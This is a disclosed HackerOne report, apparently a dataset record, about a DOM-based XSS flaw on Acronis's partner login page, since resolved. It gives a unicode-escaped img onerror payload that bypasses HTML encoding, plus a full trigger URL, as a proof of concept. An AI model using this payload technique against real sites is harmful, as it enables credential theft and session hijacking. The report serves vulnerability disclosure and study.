---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '979204'
original_report_id: '979204'
title: XSS on https://partners.acronis.com/
weakness: Cross-site Scripting (XSS) - DOM
team_handle: acronis
created_at: '2020-09-11T06:11:21.913Z'
disclosed_at: '2021-06-17T01:28:32.571Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 72
asset_identifier: '*.acronis.com'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-dom
---

# XSS on https://partners.acronis.com/

## Metadata

- HackerOne Report ID: 979204
- Weakness: Cross-site Scripting (XSS) - DOM
- Program: acronis
- Disclosed At: 2021-06-17T01:28:32.571Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hello,

I found DOM XSS on login page of https://partners.acronis.com/
Open this URL https://partners.acronis.com/en-us/profile/login.html?-back=test123"> and search for `var back =`. Here input is HTML encoded but from that reflected value, element is created and appended to the form. 
{F983552}
We can use JavaScript's unicode escaping to bypass this..
  
  

## Steps To Reproduce
  1. For this payload `"><img src=x onerror=alert(1)><x y="` we have to replace `"` with `\u0022`, `>` with `\u003e` and `<` with `\u003c`.
So the payload will be `\u0022\u003e\u003cimg src=x onerror=alert(1)\u003e\u003cx y=\u0022`
  1. Open this URL   
   ```
https://partners.acronis.com/en-us/profile/login.html?-back=\u0022\u003e\u003cimg+src=x+onerror=alert(1)\u003e\u003cx+y=\u0022
    ```
  1. And you'll see alert dialog.  
{F983553}

## Impact

Attacker can execute JavaScript code on users who open the link. This XSS is in the login page so it can be used to get someone's credentials..

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
